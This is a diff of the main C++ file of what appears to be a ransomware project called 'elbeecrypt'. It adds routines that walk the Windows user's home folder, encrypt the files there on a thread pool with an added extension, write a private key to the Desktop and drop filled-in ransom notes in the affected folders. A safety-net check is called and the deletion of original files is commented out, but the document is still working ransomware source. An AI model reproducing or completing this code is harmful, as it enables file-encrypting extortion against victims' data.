@@ -1,18 +1,16 @@
 //C++ std dependencies
-#include <filesystem>
 #include <fstream>
 #include <iostream>
 #include <map>
-#include <string>
-#include <vector>
+#include <regex>
 
 //3rd-party dependencies
-#include <fmt/core.h>
 #include "thread-pool/BS_thread_pool.hpp"
 
 //Common dependencies
 #include "elbeecrypt/common/settings.hpp"
 #include "elbeecrypt/common/io/cryptor-engine.hpp"
+#include "elbeecrypt/common/targets/extensions.hpp"
 #include "elbeecrypt/common/utils/fs.hpp"
 #include "elbeecrypt/common/utils/string.hpp"
 #include "elbeecrypt/common/utils/threadsafe_cout.hpp"
@@ -21,6 +19,8 @@
 #include "elbeecrypt/cryptor/hunter-encryptor.hpp"
 #include "elbeecrypt/cryptor/main.hpp"
 
+//Resource files
+#include "resources/cryptor/recover-your-files.hxx.res"
 
 //Platform-specific includes
 #if defined(_WIN32) || defined(__WIN32__) || defined(WIN32)
@@ -33,7 +33,6 @@
 #endif
 
 //Namespace definitions
-namespace fs = std::filesystem;
 using namespace elbeecrypt;
 
 void writeTo(fs::path path, std::string content){
@@ -56,14 +55,23 @@ int main(int argc, char **argv){
 		if(!cryptor::Main::safetyNet()) exit(-1);
 	}
 
+	//Set the root directories
+	const fs::path homeFolder("C:\\Users\\" + std::string(getenv("username")));
+	std::cout << "Base path: " << homeFolder << std::endl;
+
 	//Encrypt files
+	std::vector<fs::path> roots = {homeFolder};
 	std::cout << "Encryption routines started!" << std::endl;
-	cryptor::Main::encrypt();
+	auto encryptorResult = cryptor::Main::encrypt(homeFolder, roots);
 
+	//Get the parent paths of the encrypted files
+	std::vector<fs::path> parentPaths = common::utils::FS::getParents(std::get<0>(encryptorResult));
 
-	//Set the base path
-	
-
+	//Drop ransom notes
+	std::vector<fs::path> ransomNoteLocations;
+	if(common::Settings::SPAM_RANSOM_NOTES) ransomNoteLocations = parentPaths;
+	else ransomNoteLocations = {homeFolder / "Desktop"};
+	cryptor::Main::dropRansomNote(ransomNoteLocations, std::get<1>(encryptorResult), roots, std::get<0>(encryptorResult), homeFolder / "Desktop");
 
 
 	/*
@@ -71,6 +79,102 @@ int main(int argc, char **argv){
 		writeTo(common::io::DirentWalk::pwd() / "test-paths.txt", path.string());
 	}
 	*/
+}
+
+/** Impl of dropRansomNote(vector, CryptorEngine, vector, vector, path). */
+void cryptor::Main::dropRansomNote(
+	const std::vector<fs::path>& targets, common::io::CryptorEngine& cEngine,
+	const std::vector<fs::path>& roots, const std::vector<fs::path>& encrypted,
+	const fs::path& homeFolderDesktop
+){
+	//Load the ransom note buffer from the file
+	bin2cpp::RecoveryourfilesTxtFile ransomNoteObj = bin2cpp::RecoveryourfilesTxtFile();
+
+	//Get the contents of the ransom note as a string
+	std::string ransomNote = std::string(ransomNoteObj.getBuffer());
+
+	//Do placeholder replacement ({fmt} does not want to cooperate)
+	std::string ransomNoteFormatted = std::regex_replace(ransomNote, std::regex("%encryption_scheme%"), common::io::CryptorEngine::CIPHER_ALGO);
+	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%keypair_type%"), common::io::CryptorEngine::KEY_TYPE);
+	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%public_key_fingerprint%"), cEngine.pubkeyFingerprint());
+	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%target_extensions%"), common::utils::Container::vecStr(common::targets::Extensions::encryptable));
+	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%root_directories%"), common::utils::Container::vecPathStr(roots));
+	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%encrypted_extension%"), common::Settings::ENCRYPTED_EXTENSION);
+	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%encrypted_filelist_location%"), (homeFolderDesktop / common::Settings::ENCRYPTED_FILES_LIST_NAME).string());
+	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%total_encrypted%"), std::to_string(encrypted.size()));
+	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%spam_ransom_note%"), common::utils::String::boolStr(common::Settings::SPAM_RANSOM_NOTES));
+	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%safety_net_enabled%"), common::utils::String::boolStr(common::Settings::SAFETY_NET));
+
+	//Loop over the target path list
+	for(fs::path target : targets){
+		//Open the target, write the ransom note, and close the file in one fell swoop
+		cryptor::Main::writeToFile(target / common::Settings::RANSOM_NOTE_NAME, ransomNoteFormatted);
+	}
+}
+
+/** Impl of encrypt(path, vector). */
+std::tuple<std::vector<fs::path>, elbeecrypt::common::io::CryptorEngine> cryptor::Main::encrypt(const fs::path& homeFolder, const std::vector<fs::path>& roots){
+	//Initialize the encryption engine
+	common::io::CryptorEngine cryptorEngine(common::Settings::CRYPTO_CHUNK_SIZE);
+
+	//Get the list of targets to encrypt
+	cryptor::HunterEncryptor hunter(roots);
+
+	//Check if there's at least one target to encrypt before proceeding
+	if(hunter.getTargets().size() < 1){
+		std::cout << "Nothing to encrypt :(" << std::endl;
+		return std::make_tuple(hunter.getTargets(), cryptorEngine);
+	}
+
+	//Drop the encryption key to the desktop
+	std::string keyName = std::regex_replace(common::Settings::ENCRYPTION_KEY_NAME, std::regex("%pubkeyFingerprint%"), cryptorEngine.pubkeyFingerprint());
+	fs::path encryptionKeyPath = homeFolder / "Desktop" / keyName;
+	cryptorEngine.exportPrivkey(encryptionKeyPath);
+
+	//Shard the targets vector x ways
+	std::map<uint32_t, std::vector<fs::path>> shards = common::utils::Container::shardVector(hunter.getTargets(), common::Settings::ENCRYPTION_THREADS);
+
+	//Create vectors to store the lists of successfully and unsuccessfully encrypted files
+	std::vector<fs::path> successfullyEncrypted = {};
+	std::vector<fs::path> failedEncrypted = {};
+
+	//Create a thread pool for file encryption
+	BS::thread_pool pool(common::Settings::ENCRYPTION_THREADS);
+
+	//Create the encryptor lambda
+	auto encryptor = [&cryptorEngine, &successfullyEncrypted, &failedEncrypted](const std::vector<fs::path>& targets){
+		//Loop over the targets
+		for(fs::path target : targets){
+			//Create the path in which the target encrypted file will be dropped
+			fs::path encryptedOut = common::utils::FS::appendExt(target, common::Settings::ENCRYPTED_EXTENSION);
+
+			//Encrypt the file with the cryptor engine
+			common::io::CryptorEngine::Status encryptionResult = cryptorEngine.encryptFile(target, encryptedOut);
+
+			//Delete the file at the given path
+			//fs::remove(target);
+
+			//Add the path to the appropriate vector depending on the result
+			encryptionResult == common::io::CryptorEngine::Status::OK ?
+				successfullyEncrypted.push_back(target) :
+				failedEncrypted.push_back(target);
+		}
+	};
+
+	//Create x threads to encrypt the files
+	for(size_t i = 0; i < shards.size(); i++){
+		//Spawn a thread to encrypt the current shard of file paths
+		pool.push_task(encryptor, shards.at(i));
+		common::utils::Cout{} << "Pushed shard #" << (i + 1) << " for processing. Shard contains " << shards.at(i).size() << " paths..." << std::endl;
+	}
+
+	//Wait on the treads to complete before going on
+	pool.wait_for_tasks();
+	common::utils::Cout{} << "Encrypted " << successfullyEncrypted.size() << " files" << std::endl;
+	common::utils::Cout{} << "Failed to encrypt " << failedEncrypted.size() << " files" << std::endl;
+
+	//Return the list of successfully encrypted files
+	return std::make_tuple(successfullyEncrypted, cryptorEngine);
 }
 
 /** Impl of safetyNet(). */
@@ -106,64 +210,10 @@ bool cryptor::Main::safetyNet(){
 	return true;
 }
 
-/** Impl of encrypt(). */
-void cryptor::Main::encrypt(){
-	//Set the root directories
-	const fs::path basePath("C:\\Users\\" + std::string(getenv("username")));
-	std::cout << "Path: " << basePath << std::endl;
-
-	//Initialize the encryption engine
-	common::io::CryptorEngine cryptorEngine(common::Settings::CRYPTO_CHUNK_SIZE);
-
-	//Drop the encryption key to the desktop
-	std::string keyName = fmt::format(common::Settings::ENCRYPTION_KEY_NAME, fmt::arg("pubkeyFingerprint", cryptorEngine.pubkeyFingerprint()));
-	fs::path encryptionKeyPath = basePath / "Desktop" / keyName;
-	cryptorEngine.exportPrivkey(encryptionKeyPath);
-
-	//Get the list of targets to encrypt
-	cryptor::HunterEncryptor hunter({basePath});
-
-	//Shard the targets vector x ways
-	std::map<uint32_t, std::vector<fs::path>> shards = common::utils::Container::shardVector(hunter.getTargets(), common::Settings::ENCRYPTION_THREADS);
-
-	//Create vectors to store the lists of  and unsuccessfully encrypted files
-	std::vector<fs::path> successfullyEncrypted = {};
-	std::vector<fs::path> failedEncrypted = {};
-
-	//Create a thread pool for file encryption
-	BS::thread_pool pool(common::Settings::ENCRYPTION_THREADS);
-
-	//Create the encryptor lambda
-	auto encryptor = [&cryptorEngine, &successfullyEncrypted, &failedEncrypted](const std::vector<fs::path>& targets){
-		//Loop over the targets
-		for(fs::path target : targets){
-			//Create the path in which the target encrypted file will be dropped
-			fs::path encryptedOut = common::utils::FS::appendExt(target, common::Settings::ENCRYPTED_EXTENSION);
-
-			//Encrypt the file with the cryptor engine
-			common::io::CryptorEngine::Status encryptionResult = cryptorEngine.encryptFile(target, encryptedOut);
-
-			//Delete the file at the given path
-			//fs::remove(target);
-
-			//Add the path to the appropriate vector depending on the result
-			encryptionResult == common::io::CryptorEngine::Status::OK ? 
-				successfullyEncrypted.push_back(target) :
-				failedEncrypted.push_back(target);
-		}
-	};
-
-	//std::cout << shards.at(0).at(0) << std::endl;
-
-	//Create x threads to encrypt the files
-	for(size_t i = 0; i < shards.size(); i++){
-		//Spawn a thread to encrypt the current shard of file paths
-		pool.push_task(encryptor, shards.at(i));
-		common::utils::Cout{} << "Pushed shard #" << (i + 1) << " for processing. Shard contains " << shards.at(i).size() << " items..." << std::endl;
-	}
-
-	//Wait on the treads to complete before going on
-	pool.wait_for_tasks();
-	common::utils::Cout{} << "Encrypted " << successfullyEncrypted.size() << " files" << std::endl;
-	common::utils::Cout{} << "Failed to encrypt " << failedEncrypted.size() << " files" << std::endl;
+/** Impl of writeToFile(path, string). */
+void cryptor::Main::writeToFile(const fs::path& target, std::string content){
+	//Open the file, write to it, and close
+	std::ofstream file(target.string(), std::ios::app | std::ios::out);
+	file << content << std::endl;
+	file.close();
 }
